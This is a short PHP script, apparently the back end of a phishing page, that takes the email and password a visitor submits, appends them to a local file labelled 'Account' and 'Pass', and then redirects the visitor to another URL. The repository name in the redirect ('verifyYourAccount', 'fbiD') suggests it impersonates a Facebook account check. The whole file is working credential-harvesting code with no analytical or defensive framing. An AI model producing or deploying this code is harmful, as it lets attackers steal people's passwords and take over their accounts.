<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://github.com/matanghulbedegong1A/verifyYourAccount-php-fbiD/edit/main/login-1.php/');
exit();
